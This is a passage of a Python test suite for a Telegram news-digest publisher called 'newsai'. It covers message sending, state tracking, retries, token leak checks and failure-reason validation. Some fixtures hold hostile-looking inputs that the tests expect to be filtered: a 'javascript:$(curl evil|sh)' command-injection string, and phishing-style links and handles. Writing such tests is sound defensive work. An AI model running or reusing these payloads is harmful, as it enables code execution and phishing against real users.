        self.sost = self.papka / "sostoyanie.json"
        self.sekrety = self.papka / "sekrety"
        okr = {"NEWSAI_SOSTOYANIE": str(self.sost), "NEWSAI_PROGON": str(PROGON),
               "NEWSAI_VYPUSK": str(VYPUSK), "NEWSAI_SBOJ": str(self.papka / "sboj.json"),
               PEREMENNAYA: LOZHNYY}
        for zaplatka in (mock.patch.dict(os.environ, okr),
                         mock.patch.object(nastrojki, "FAYL_SEKRETOV", self.sekrety),
                         mock.patch.object(publikaciya, "seychas", return_value=SEYCHAS)):
            zaplatka.start()
            self.addCleanup(zaplatka.stop)
        os.environ.pop("NEWSAI_REZHIM_PROVERKI", None)
        s_nastrojkami(self)
        self.addCleanup(self._papka.cleanup)

    def svoy_vypusk(self, dannye: dict) -> None:
        put = self.papka / "vypusk.json"
        put.write_text(json.dumps(dannye, ensure_ascii=False), encoding="utf-8")
        os.environ["NEWSAI_VYPUSK"] = str(put)

    def fayl_sboya(self, dannye) -> None:
        (self.papka / "sboj.json").write_text(json.dumps(dannye, ensure_ascii=False), encoding="utf-8")

    def zapusk(self, telegram: Telegram | None = None, **kw):
        out, err = io.StringIO(), io.StringIO()
        telegram = telegram or Telegram()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err), \
                mock.patch.object(publikaciya, "_soedinenie", telegram), \
                mock.patch.object(publikaciya, "_pauza") as self.pauza:
            kod = publikaciya.opublikovat(**kw)
        return kod, out.getvalue(), err.getvalue(), telegram


class Otpravka(SFaylami):
    def test_kazhdyy_punkt_v_sostoyanii_do_sleduyushchego_soobshcheniya(self):
        na_diske = []
        telegram = Telegram(pri_zaprose=lambda: na_diske.append(sostoyanie.zagruzit(self.sost)))
        kod, out, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 0, err)
        self.assertEqual([z.full_url for z in telegram.zaprosy],
                         ["https://api.telegram.org/bot123456:poddelka-dlya-testa/sendMessage"] * 7)
        self.assertEqual(telegram.tela(), OZHIDAEMYE_ZAPROSY)
        self.assertEqual(na_diske[0]["opublikovannye"], [])
        self.assertEqual(na_diske[1]["opublikovannye"], [
            {"zagolovok": "Anthropic выпустила Claude Opus 5.5 — «модель <для агентов>» & не только",
             "url": URL_OPUS, "data": "2026-11-11T02:20:00Z", "vid": "krupnaya", "oboroty": False}])
        self.assertIn("https://x.com/AnthropicAI/status/1988000000000000001", na_diske[1]["vidennye"])
        self.assertEqual(len(na_diske[6]["opublikovannye"]), 8)
        self.assertIsNone(na_diske[6]["posledniy_sbor"])

        itog = sostoyanie.zagruzit(self.sost)
        self.assertEqual([(p["url"], p["vid"], p["oboroty"]) for p in itog["opublikovannye"]], [
            (URL_OPUS, "krupnaya", False),
            (URL_CODEX, "krupnaya", True),
            ("https://deepmind.google/blog/deep-think-api/", "sayty", False),
            ("https://www.bensbites.com/p/week-45?a=1&b=2", "sayty", False),
            ("https://x.com/sama/status/1988000000000000002", "x", False),
            ("https://x.com/simonw/status/1988000000000000003", "x", False),
            ("https://www.techmeme.com/261110/p12", "dengi", False),
            ("https://github.com/anthropics/claude-code/issues/4321", "github", False),
        ])
        self.assertEqual(itog["posledniy_sbor"], "2026-11-11T01:07:00Z")
        self.assertEqual(itog["posledniy_slot"], "2026-11-11T02:00:00Z")
        self.assertIs(itog["github_obhod"], True)
        for i in ("https://simonwillison.net/2026/Nov/10/fixed-typo/",
                  "https://github.com/anthropics/claude-code/issues/1000"):
            self.assertIn(i, itog["vidennye"])
        self.assertNotIn("https://simonwillison.net/2026/Nov/10/opus-5-5/", itog["vidennye"])
        self.assertEqual(out.strip(), "отправлено сообщений: 7")

    def test_token_iz_fayla_sekretov(self):
        del os.environ[PEREMENNAYA]
        self.sekrety.write_text("# бот\nTELEGRAM_BOT_TOKEN=987:iz_fayla-sekretov\n", encoding="utf-8")
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.zaprosy[0].full_url, "https://api.telegram.org/bot987:iz_fayla-sekretov/sendMessage")

    def test_net_tokena_otkaz(self):
        del os.environ[PEREMENNAYA]
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 1)
        self.assertIn("нет TELEGRAM_BOT_TOKEN", err)
        self.assertEqual(telegram.zaprosy, [])
        self.assertFalse(self.sost.exists())

    def test_token_ne_togo_vida_otkaz_bez_znacheniya(self):
        os.environ[PEREMENNAYA] = "123456:AAA BBB-proba"
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 1)
        self.assertIn("TELEGRAM_BOT_TOKEN в переменной окружения не того вида", err)
        self.assertNotIn("AAA BBB", err)
        self.assertEqual(telegram.zaprosy, [])

    def test_obryv_posredi_vypuska_stroka_sboya(self):
        telegram = Telegram(Telegram.ok(), http_oshibka(400, {"ok": False, "error_code": 400,
                                                              "description": "Bad Request: chat not found"}))
        kod, _, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 1)
        self.assertEqual(err, "newsai opublikovat: отправлено 1 из 7, ошибка: sendMessage: 400 Bad Request: chat not "
                              "found\nnewsai opublikovat: причина строки сбоя: отказ Bot API, часть выпуска ушла\n")
        self.assertEqual(len(telegram.zaprosy), 3)
        self.assertEqual(telegram.tela()[2], {
            "chat_id": KANAL, "text": "⚠️ Выпуск 09:00 отправлен не полностью — Telegram не принял сообщение"})
        self.assertEqual([t["text"] for t in telegram.tela() if t["text"].startswith("⚠️ Выпуск")],
                         ["⚠️ Выпуск 09:00 отправлен не полностью — Telegram не принял сообщение"])
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual([p["url"] for p in sost["opublikovannye"]], [URL_OPUS])
        self.assertIsNone(sost["posledniy_sbor"])
        self.assertEqual(sost["posledniy_slot"], "2026-11-11T02:00:00Z")
        self.assertIs(sost["github_obhod"], False)

    def test_sbros_pri_podklyuchenii_na_tretem_uspeh_na_povtore(self):
        telegram = Telegram(Telegram.ok(), Otvet(200, Telegram.ok(), zakryt=True),
                            Sboj("connect", ConnectionResetError(104, "Connection reset by peer")))
        kod, out, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), OZHIDAEMYE_ZAPROSY)
        self.assertEqual([len(s.zaprosy) for s in telegram.soedineniya], [2, 0, 5])
        self.assertEqual([c.args for c in self.pauza.call_args_list], [(5,)])
        self.assertFalse([t for t in telegram.tela() if "не собран" in t["text"]])
        self.assertEqual(len(sostoyanie.zagruzit(self.sost)["opublikovannye"]), 8)
        self.assertEqual(out.strip(), "отправлено сообщений: 7")
        self.assertEqual(err, "")

    def test_obryv_na_pervom_soobshchenii(self):
        telegram = Telegram(http_oshibka(403, {"ok": False, "error_code": 403,
                                               "description": "Forbidden: bot is not a member"}))
        kod, _, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 1)
        self.assertEqual(telegram.tela()[1:], [{
            "chat_id": KANAL, "text": "⚠️ Выпуск 09:00 не отправлен — Telegram не принял сообщение"}])
        self.assertEqual(err, "newsai opublikovat: отправлено 0 из 7, ошибка: sendMessage: 403 Forbidden: bot is not a "
                              "member\nnewsai opublikovat: причина строки сбоя: отказ Bot API на первом сообщении\n")
        self.assertEqual(sostoyanie.zagruzit(self.sost)["opublikovannye"], [])

    def test_obryv_svyazi_posredi_vypuska(self):
        sbros = ConnectionResetError(104, "Connection reset by peer")
        telegram = Telegram(Telegram.ok(), Sboj("getresponse", sbros), Sboj("getresponse", sbros))
        kod, _, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 1)
        self.assertEqual(len(telegram.zaprosy), 4)
        self.assertEqual(telegram.tela()[3], {
            "chat_id": KANAL, "text": "⚠️ Выпуск 09:00 отправлен не полностью — Telegram оборвал связь"})
        self.assertEqual(err, "newsai opublikovat: отправлено 1 из 7, ошибка: sendMessage: нет ответа Bot API после "
                              "повтора: ConnectionResetError: [Errno 104] Connection reset by peer\n"
                              "newsai opublikovat: причина строки сбоя: обрыв связи, часть выпуска ушла\n")
        self.assertEqual([p["url"] for p in sostoyanie.zagruzit(self.sost)["opublikovannye"]], [URL_OPUS])

    def test_obryv_svyazi_na_pervom_soobshchenii(self):
        sbros = ConnectionResetError(104, "Connection reset by peer")
        telegram = Telegram(*[Sboj("connect", sbros)] * 3)
        kod, _, err, _ = self.zapusk(telegram)
        self.assertEqual(kod, 1)
        self.assertEqual(telegram.tela(), [{
            "chat_id": KANAL, "text": "⚠️ Выпуск 09:00 не отправлен — Telegram оборвал связь"}])
        self.assertEqual([c.args for c in self.pauza.call_args_list], [(5,), (5,)])
        self.assertEqual(err, "newsai opublikovat: отправлено 0 из 7, ошибка: sendMessage: нет связи с Bot API после "
                              "3 попыток: ConnectionResetError: [Errno 104] Connection reset by peer\n"
                              "newsai opublikovat: причина строки сбоя: обрыв связи на первом сообщении\n")
        self.assertEqual(sostoyanie.zagruzit(self.sost)["opublikovannye"], [])

    def test_isklyuchenie_s_tokenom_ne_utekaet(self):
        oshibka = http.client.InvalidURL(f"URL can't contain control characters. '/bot{LOZHNYY}/sendMessage'")
        kod, out, err, telegram = self.zapusk(Telegram(oshibka, RuntimeError(f"сбой {LOZHNYY}")))
        self.assertEqual(kod, 1)
        self.assertEqual(len(telegram.zaprosy), 2)
        self.assertNotIn(LOZHNYY, out + err)
        self.assertIn("InvalidURL", err)
        self.assertIn("строка сбоя не отправлена: sendMessage: RuntimeError: сбой ***", err)

    def test_otkaz_do_pervoy_otpravki(self):
        v = obrazec_vypuska()
        v["sayty"] += [sayt(n, zagolovok="&" * 300) for n in range(3, 6)]
        self.svoy_vypusk(v)
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 1)
        self.assertEqual(telegram.zaprosy, [])
        self.assertIn("4096", err)
        self.assertFalse(self.sost.exists())

    def test_pustoy_vypusk_shlet_stroku_sbora_i_sdvigaet_period(self):
        self.svoy_vypusk({"krupnye": [], "sayty": [], "x": [], "dengi": [], "github": []})
        kod, out, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "parse_mode": "HTML", "link_preview_options": {"is_disabled": True},
                     "text": "ℹ️ В выпуск ничего не отобрано · источники 1 из 3 (не ответили: обновления OpenAI API, Techmeme) · "
                             "X 2 из 4 (не ответили: @gdb, @AT_T) · найдено 11, новых 10, в выпуске 0"}])
        self.assertEqual(out.strip(), "выпуск пустой — отправлена служебная строка сбора")
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual(sost["posledniy_sbor"], "2026-11-11T01:07:00Z")
        self.assertEqual(sost["posledniy_slot"], "2026-11-11T02:00:00Z")
        self.assertEqual(sost["opublikovannye"], [])
        self.assertIn(URL_CODEX, sost["vidennye"])


class SboromPublikatora(SFaylami):
    """У публикатора NEWSAI_PROGON — его сбор (tests/proverka/sbor-publikatora.json), а не файл прогона
    заявки: служебная строка сбора, конец периода и увиденное — оттуда."""

    def setUp(self):
        super().setUp()
        obrazcy = Path(__file__).resolve().parent / "proverka"
        os.environ["NEWSAI_PROGON"] = str(obrazcy / "sbor-publikatora.json")
        os.environ["NEWSAI_VYPUSK"] = str(obrazcy / "vypusk.json")

    def test_stroka_sbora_i_uvidennoe_iz_sbora_publikatora(self):
        kod, out, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela()[-1], {"chat_id": KANAL, "parse_mode": "HTML",
                                               "link_preview_options": {"is_disabled": True},
                                               "text": "ℹ️ Сбор: источники 2 из 3 (не ответил: обновления "
                                                       "OpenAI API) · найдено 8, новых 7, в выпуске 6"})
        self.assertEqual(len(telegram.tela()), 7)
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual(sost["posledniy_sbor"], "2026-11-11T01:15:00Z")
        self.assertEqual(sorted(sost["vidennye"]), [
            "https://deepmind.google/blog/deep-think-api/",
            "https://github.com/anthropics/claude-code/issues/4321",
            "https://openai.com/index/codex-for-everyone/",
            "https://www.anthropic.com/news/claude-opus-5-5",
            "https://www.techmeme.com/261110/p12",
            "https://x.com/AnthropicAI/status/1988000000000000001",
            "https://x.com/sama/status/1988000000000000002",
        ])
        self.assertIs(sost["github_obhod"], False)

    def test_slot_po_chasam_publikatora_pozdnee_vsego(self):
        with mock.patch.object(publikaciya, "seychas",
                               return_value=datetime(2026, 11, 11, 5, 59, 59, tzinfo=timezone.utc)):
            kod, _, err, _ = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(sostoyanie.zagruzit(self.sost)["posledniy_slot"], "2026-11-11T02:00:00Z")

    def test_suhoj_stroka_sbora_iz_sbora(self):
        del os.environ[PEREMENNAYA]
        kod, out, _, _ = self.zapusk(suhoj=True)
        self.assertEqual(kod, 0)
        self.assertEqual(out.count("--- запрос "), 7)
        self.assertIn('--- запрос 7 из 7: sendMessage\n{\n  "chat_id": -1004434993234,\n'
                      '  "text": "ℹ️ Сбор: источники 2 из 3 (не ответил: обновления OpenAI API) · найдено 8, новых 7, '
                      'в выпуске 6"', out)


class FaylSboya(SFaylami):
    def setUp(self):
        super().setUp()
        os.environ["NEWSAI_VYPUSK"] = str(self.papka / "vypuska-net.json")
        os.environ["NEWSAI_PROGON"] = str(self.papka / "progona-net.json")
        prezhnee = sostoyanie.pustoe()
        prezhnee["posledniy_sbor"] = "2026-11-10T18:07:00Z"
        sostoyanie.sohranit(prezhnee, self.sost)

    def test_stroka_sboya_slot_bez_sdviga_perioda(self):
        self.fayl_sboya({"prichina": "не ответил ни один источник"})
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                            "text": "⚠️ Выпуск 09:00 не собран: ни один источник не ответил"}])
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual(sost["posledniy_sbor"], "2026-11-10T18:07:00Z")
        self.assertEqual(sost["posledniy_slot"], "2026-11-11T02:00:00Z")
        self.assertEqual(sost["vidennye"], {})

    def test_suhoj_pechataet_i_ne_trogaet_sostoyanie(self):
        self.fayl_sboya({"prichina": "проверка выпуска не прошла"})
        del os.environ[PEREMENNAYA]
        kod, out, _, telegram = self.zapusk(suhoj=True)
        self.assertEqual(kod, 0)
        self.assertEqual(telegram.zaprosy, [])
        self.assertEqual(out, '--- запрос 1 из 1: sendMessage\n{\n  "chat_id": -1004434993234,\n'
                              '  "text": "⚠️ Выпуск 09:00 не собран: выпуск не прошёл проверку"\n}\n')
        self.assertIsNone(sostoyanie.zagruzit(self.sost)["posledniy_slot"])

    def test_kazhdaya_fraza_nabora(self):
        for prichina, v_kanale in (("сбор упал", "⚠️ Выпуск 09:00 не собран: сбор новостей упал"),
                                   ("не ответил ни один источник",
                                    "⚠️ Выпуск 09:00 не собран: ни один источник не ответил"),
                                   ("проверка выпуска не прошла",
                                    "⚠️ Выпуск 09:00 не собран: выпуск не прошёл проверку")):
            with self.subTest(prichina=prichina):
                self.fayl_sboya({"prichina": f"  {prichina} "})
                kod, _, err, telegram = self.zapusk()
                self.assertEqual(kod, 0, err)
                self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": v_kanale}])
                self.assertEqual(err, f"newsai opublikovat: файл сбоя, причина: {prichina}\n")

    def test_prichina_ne_iz_nabora_otkaz_bez_teksta_agenta(self):
        for prichina in ("сбор упал: https://evil.example/login", "сбор упал: t.me/evil_channel",
                         "не ответил ни один источник — пишите @evil_bot", "сбор упал: evil.com",
                         "три отказа proverit", "Сбор упал"):
            with self.subTest(prichina=prichina):
                self.fayl_sboya({"prichina": prichina})
                kod, out, err, telegram = self.zapusk()
                self.assertEqual(kod, 1)
                self.assertEqual(telegram.zaprosy, [])
                self.assertEqual(err, "newsai opublikovat: отказ, ничего не отправлено: файл сбоя: причина не из "
                                      "набора причин публикатора\n")
                self.assertNotIn("evil", out + err)

    def test_i_vypusk_i_sboj_otkaz(self):
        self.fayl_sboya({"prichina": "сбой"})
        os.environ["NEWSAI_VYPUSK"] = str(VYPUSK)
        kod, _, err, telegram = self.zapusk()
        self.assertEqual(kod, 1)
        self.assertIn("и файл выпуска, и файл сбоя", err)
        self.assertEqual(telegram.zaprosy, [])

    def test_negodnyy_fayl_sboya_otkaz(self):
        for plohoy in ({"prichina": "я" * 201}, {"prichina": ""}, {"prichina": "раз\nдва"},
                       {"prichina": "сбой", "lishnee": 1}, ["сбой"]):
            with self.subTest(plohoy=plohoy):
                self.fayl_sboya(plohoy)
                kod, _, _, telegram = self.zapusk()
                self.assertEqual(kod, 1)
                self.assertEqual(telegram.zaprosy, [])
        self.fayl_sboya({"prichina": "сбор упал"})
        self.assertEqual(self.zapusk()[0], 0)


class DengiIzX(SFaylami):
    """Пункт денег с akkaunt: отправка строки как в списке X и вид пункта в состоянии — dengi."""

    def test_otpravka_i_sostoyanie(self):
        os.environ["NEWSAI_VYPUSK"] = str(VYPUSK_DENGI_X)
        kod, out, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), OZHIDAEMYE_ZAPROSY_DENGI_X)
        itog = sostoyanie.zagruzit(self.sost)
        self.assertEqual([(p["url"], p["vid"], p["oboroty"]) for p in itog["opublikovannye"]], [
            ("https://x.com/sama/status/1988000000000000004", "dengi", False),
            ("https://www.techmeme.com/261110/p12", "dengi", False),
        ])
        self.assertEqual(out.strip(), "отправлено сообщений: 2")


class IssueVUvidennyh(SFaylami):
    """Шов «opublikovat на записанном сборе публикатора с issue GitHub»: в vidennye — только вышедший
    issue и tolko_v_vidennye; невышедший issue сбора с датой раньше запаса в следующем сборе снова
    кандидат."""

    VYSHEL = "https://github.com/anthropics/claude-code/issues/4321"
    NE_VYSHEL = "https://github.com/anthropics/claude-code/issues/5555"
    TOLKO = "https://github.com/anthropics/claude-code/issues/1000"

    def setUp(self):
        super().setUp()
        def issue(url, zagolovok):
            return {"id": url, "istochnik": "GitHub Claude Code", "zagolovok": zagolovok, "url": url,
                    "data": "2026-11-10T23:20:00Z", "tekst": "Feature request.", "skoro": True, "novyy": True}
        sbor_ = {"nachalo_progona": "2026-11-11T02:15:00Z", "nachalo_perioda": "2026-11-10T18:07:00Z",
                 "pervyy_progon": False,
                 "kandidaty": [issue(self.VYSHEL, "Custom panels"), issue(self.NE_VYSHEL, "Linux build"),
                               {"id": "https://cursor.com/changelog/2-9", "istochnik": "Cursor",
                                "zagolovok": "Cursor 2.9", "url": "https://cursor.com/changelog/2-9",
                                "data": "2026-11-10T22:00:00Z", "tekst": "Notes.", "skoro": False,
                                "novyy": True}],
                 "ne_otvetili": [], "tolko_v_vidennye": [self.TOLKO], "github_polnyy_obhod": True}
        put = self.papka / "sbor.json"
        put.write_text(json.dumps(sbor_, ensure_ascii=False), encoding="utf-8")
        os.environ["NEWSAI_PROGON"] = str(put)
        self.svoy_vypusk({"krupnye": [], "sayty": [], "x": [], "dengi": [],
                          "github": [{"zagolovok": "Свои панели для модов", "url": self.VYSHEL,
                                      "idy": [self.VYSHEL]}]})

    def test_tolko_vyshedshiy_issue_v_uvidennyh(self):
        from newsai import gitkhab
        from newsai.progon import Period

        kod, out, err, telegram = self.zapusk()
        self.assertEqual(kod, 0, err)
        self.assertEqual(out.strip(), "отправлено сообщений: 2")
        sost = sostoyanie.zagruzit(self.sost)
        self.assertEqual(sorted(sost["vidennye"]), [
            "https://cursor.com/changelog/2-9",
            "https://github.com/anthropics/claude-code/issues/1000",
            "https://github.com/anthropics/claude-code/issues/4321",
        ])
        self.assertIs(sost["github_obhod"], True)
        self.assertIs(sostoyanie.obhod_deystvuet(sost), True)
        zapisi = [{"url": u, "zagolovok": "Issue", "obnovleno": "2026-11-10T23:20:00Z", "reakcii": 120,
                   "kommentariev": 3, "sostoyanie": "open", "tekst": "Feature request.",
                   "otvet_komandy": {"login": "bcherny", "data": "2026-11-01T00:00:00Z", "tekst": "Soon."}}
                  for u in (self.VYSHEL, self.NE_VYSHEL, self.TOLKO)]
        ist = {"imya": "GitHub Claude Code", "vid": "github_issues"}
        sleduyushchiy = Period(datetime(2026, 11, 11, 9, 15, tzinfo=timezone.utc),
                               datetime(2026, 11, 11, 10, 7, tzinfo=timezone.utc))
        kandidaty, tolko = gitkhab.kandidaty_iz_zapisey(ist, zapisi, sost, sleduyushchiy)
        self.assertEqual(([k.identifikator for k in kandidaty], tolko),
                         (["https://github.com/anthropics/claude-code/issues/5555"], []))


class SuhojVProcesse(SFaylami):
    def test_bez_tokena_bez_sostoyaniya_pechataet_zaprosy(self):
        del os.environ[PEREMENNAYA]
        kod, out, _, telegram = self.zapusk(suhoj=True)
        self.assertEqual(kod, 0)
        self.assertEqual(out.count("--- запрос "), 7)
        self.assertEqual(telegram.zaprosy, [])
        self.assertFalse(self.sost.exists())


class SuhojKomanda(SFaylami):
    """`python -m newsai opublikovat --suhoj` на образцах прогона и выпуска."""

    def zapros_komandy(self):
        okr = {k: v for k, v in os.environ.items() if k != PEREMENNAYA}
        kod = ("import runpy, sys; from pathlib import Path; from newsai import nastrojki; "
               "nastrojki.FAYL_ISTOCHNIKOV = Path(sys.argv[1]); sys.argv = ['newsai', 'opublikovat', '--suhoj']; "
               "runpy.run_module('newsai', run_name='__main__')")
        return subprocess.run([sys.executable, "-c", kod, str(NASTROJKI)],
                              cwd=nastrojki.KOREN, env=okr, capture_output=True, text=True,
                              encoding="utf-8", timeout=60)

    def test_zaprosy_k_bot_api(self):
        r = self.zapros_komandy()
        self.assertEqual(r.returncode, 0, r.stderr)
        bloki = [b for b in r.stdout.split("--- запрос ") if b.strip()]
        self.assertEqual(len(bloki), 7)
        zaprosy = []
        for n, b in enumerate(bloki, 1):
            zagolovok, _, telo = b.partition("\n")
            self.assertEqual(zagolovok, f"{n} из 7: sendMessage")
            zaprosy.append(json.loads(telo))
        self.assertEqual(zaprosy, OZHIDAEMYE_ZAPROSY)
        self.assertNotIn("api.telegram.org/bot", r.stdout)
        self.assertFalse(self.sost.exists())

    def test_dengi_iz_x(self):
        os.environ["NEWSAI_VYPUSK"] = str(VYPUSK_DENGI_X)
        r = self.zapros_komandy()
        self.assertEqual(r.returncode, 0, r.stderr)
        bloki = [b for b in r.stdout.split("--- запрос ") if b.strip()]
        self.assertEqual([b.partition("\n")[0] for b in bloki], ["1 из 2: sendMessage", "2 из 2: sendMessage"])
        self.assertEqual([json.loads(b.partition("\n")[2]) for b in bloki], OZHIDAEMYE_ZAPROSY_DENGI_X)
        self.assertFalse(self.sost.exists())

    def test_otkaz_bez_fayla_vypuska(self):
        os.environ["NEWSAI_VYPUSK"] = str(self.papka / "netu.json")
        r = self.zapros_komandy()
        self.assertEqual(r.returncode, 1)
        self.assertIn("файл выпуска", r.stderr)


class SbojINesohraneno(unittest.TestCase):
    """`sboj --prichina-iz` и `nesohraneno` через точку входа; отправка — подменённое соединение."""

    def setUp(self):
        papka = nastrojki.KOREN / "temp"
        papka.mkdir(exist_ok=True)
        self._papka = tempfile.TemporaryDirectory(dir=papka)
        self.papka = Path(self._papka.name)
        for zaplatka in (mock.patch.dict(os.environ, {PEREMENNAYA: LOZHNYY}),
                         mock.patch.object(nastrojki, "FAYL_SEKRETOV", self.papka / "sekrety"),
                         mock.patch.object(publikaciya, "seychas", return_value=SEYCHAS)):
            zaplatka.start()
            self.addCleanup(zaplatka.stop)
        os.environ.pop("NEWSAI_REZHIM_PROVERKI", None)
        s_nastrojkami(self)
        self.addCleanup(self._papka.cleanup)

    def komanda(self, *argumenty):
        telegram = Telegram()
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err), \
                mock.patch.object(publikaciya, "_soedinenie", telegram), mock.patch.object(publikaciya, "_pauza"):
            kod = tochka.main(list(argumenty))
        return kod, telegram, err.getvalue()

    def prichina(self, tekst: str) -> str:
        put = self.papka / "prichina.txt"
        put.write_text(tekst, encoding="utf-8")
        return str(put)

    def test_sboj_pervaya_stroka_fayla_bez_parse_mode(self):
        put = self.prichina("адрес не http(s): javascript:$(curl evil|sh) `id`\nвторая строка\n")
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", put)
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": "⚠️ Выпуск 09:00 не собран"}])
        self.assertEqual(err, "newsai sboj: причина строки сбоя: адрес не http(s): javascript:$(curl evil|sh) `id`\n")

    def test_sboj_prichina_do_200_znakov(self):
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("я" * 250 + "\n"))
        self.assertEqual(kod, 0)
        self.assertEqual(telegram.tela()[0]["text"], "⚠️ Выпуск 09:00 не собран")
        self.assertEqual(err, "newsai sboj: причина строки сбоя: " + "я" * 200 + "\n")

    def test_sboj_kazhdaya_stroka_tablicy(self):
        for prichina, v_kanale in (
                ("сбор упал", "⚠️ Выпуск 09:00 не собран: сбор новостей упал"),
                ("не ответил ни один источник", "⚠️ Выпуск 09:00 не собран: ни один источник не ответил"),
                ("проверка выпуска не прошла", "⚠️ Выпуск 09:00 не собран: выпуск не прошёл проверку"),
                ("заявка не прошла проверку: схема, ссылки", "⚠️ Выпуск 09:00 не собран: выпуск не прошёл проверку"),
                ("  заявка   не прошла проверку:  слот", "⚠️ Выпуск 09:00 не собран: выпуск не прошёл проверку"),
                ("сбор публикатора не удался",
                 "⚠️ Выпуск 09:00 не собран: не удалось перепроверить новости перед публикацией"),
                ("заявка агента не пришла", "⚠️ Выпуск 09:00 не собран: агент не прислал выпуск"),
                ("обрыв связи, часть выпуска ушла", "⚠️ Выпуск 09:00 отправлен не полностью — Telegram оборвал связь"),
                ("обрыв связи на первом сообщении", "⚠️ Выпуск 09:00 не отправлен — Telegram оборвал связь"),
                ("отказ Bot API, часть выпуска ушла",
                 "⚠️ Выпуск 09:00 отправлен не полностью — Telegram не принял сообщение"),
                ("отказ Bot API на первом сообщении", "⚠️ Выпуск 09:00 не отправлен — Telegram не принял сообщение"),
                ("сбор   упал ", "⚠️ Выпуск 09:00 не собран: сбор новостей упал"),
                ("Сбор упал", "⚠️ Выпуск 09:00 не собран"),
                ("сбор упал: подробности", "⚠️ Выпуск 09:00 не собран"),
                ("заявка не прошла проверку", "⚠️ Выпуск 09:00 не собран"),
                ("часть выпуска не отправлена: sendMessage: 400", "⚠️ Выпуск 09:00 не собран")):
            with self.subTest(prichina=prichina):
                kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina(prichina + "\n"))
                self.assertEqual(kod, 0, err)
                self.assertEqual(telegram.tela(), [{"chat_id": KANAL, "text": v_kanale}])
                self.assertEqual(err, "newsai sboj: причина строки сбоя: " + " ".join(prichina.split()) + "\n")

    def test_sboj_pustoy_fayl_i_net_fayla(self):
        self.assertEqual(self.komanda("sboj", "--prichina-iz", self.prichina("\n"))[0], 2)
        self.assertEqual(self.komanda("sboj", "--prichina-iz", str(self.papka / "netu.txt"))[0], 2)

    def test_sboj_bez_fayla_prichiny_ne_prinimaetsya(self):
        with contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit) as e:
            tochka.main(["sboj", "причина аргументом"])
        self.assertEqual(e.exception.code, 2)

    def test_nesohraneno(self):
        kod, telegram, err = self.komanda("nesohraneno")
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{
            "chat_id": KANAL, "text": "состояние не сохранено — следующий выпуск может повторить новости"}])

    def test_nesohraneno_oshibka_otpravki_kod_1(self):
        telegram = Telegram(http_oshibka(403, {"ok": False, "error_code": 403, "description": "Forbidden"}))
        with contextlib.redirect_stderr(io.StringIO()), mock.patch.object(publikaciya, "_soedinenie", telegram), \
                mock.patch.object(publikaciya, "_pauza"):
            self.assertEqual(publikaciya.nesohraneno(), 1)


SOBYTIE = Path(__file__).resolve().parent / "proverka" / "sobytie.json"


class SbojSlotIzZayavki(unittest.TestCase):
    """`sboj --prichina-iz <файл> --slot-iz-zayavki <event.json>`: слот открытия заявки — в строку и в
    posledniy_slot, posledniy_sbor не меняется. Часы публикатора — 17:30 по Бангкоку, чтобы слот шёл
    из события, а не из часов."""

    komanda = SbojINesohraneno.komanda
    prichina = SbojINesohraneno.prichina

    def setUp(self):
        SbojINesohraneno.setUp(self)
        zaplatka = mock.patch.object(publikaciya, "seychas",
                                     return_value=datetime(2026, 11, 11, 10, 30, tzinfo=timezone.utc))
        zaplatka.start()
        self.addCleanup(zaplatka.stop)
        self.sost = self.papka / "sostoyanie.json"
        zaplatka = mock.patch.dict(os.environ, {"NEWSAI_SOSTOYANIE": str(self.sost)})
        zaplatka.start()
        self.addCleanup(zaplatka.stop)
        self.prezhnee = {"posledniy_sbor": "2026-11-10T18:07:00Z", "posledniy_slot": "2026-11-10T10:00:00Z",
                         "github_obhod": True, "vidennye": {"https://a/1": "2026-11-10T20:00:00Z"},
                         "opublikovannye": []}
        self.sost.write_text(json.dumps(self.prezhnee), encoding="utf-8")

    def test_slot_zayavki_bez_sdviga_perioda(self):
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("сбор публикатора не удался\n"),
                                          "--slot-iz-zayavki", str(SOBYTIE))
        self.assertEqual(kod, 0, err)
        self.assertEqual(telegram.tela(), [{"chat_id": KANAL,
                                            "text": "⚠️ Выпуск 09:00 не собран: не удалось перепроверить новости "
                                                    "перед публикацией"}])
        self.assertEqual(json.loads(self.sost.read_text(encoding="utf-8")),
                         {**self.prezhnee, "posledniy_slot": "2026-11-11T02:00:00Z"})

    def test_bez_sostoyaniya_pishet_tolko_slot(self):
        self.sost.unlink()
        kod, telegram, err = self.komanda("sboj", "--prichina-iz", self.prichina("заявка не прошла проверку: схема\n"),
                                          "--slot-iz-zayavki", str(SOBYTIE))
        self.assertEqual(kod, 0, err)
        self.assertEqual(len(telegram.tela()), 1)
        sost = sostoyanie.zagruzit(self.sost)
